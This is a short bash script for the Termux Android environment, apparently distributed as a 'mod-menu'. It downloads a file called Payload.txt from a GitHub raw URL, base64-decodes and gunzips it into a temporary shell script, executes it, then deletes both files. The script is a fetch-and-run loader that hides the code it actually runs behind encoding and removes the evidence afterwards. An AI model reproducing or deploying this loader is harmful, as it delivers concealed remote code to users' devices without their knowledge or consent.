#!/data/data/com.termux/files/usr/bin/bash

URL="https://raw.githubusercontent.com/kaleb7776/mod-menu/main/Payload.txt"

TMP="/data/data/com.termux/files/usr/tmp/payload.$$"

curl -fsSL "$URL" -o "$TMP.b64" || exit 1

base64 -d "$TMP.b64" | gunzip > "$TMP.sh" || exit 1

chmod +x "$TMP.sh"

bash "$TMP.sh"

rm -f "$TMP.b64" "$TMP.sh"
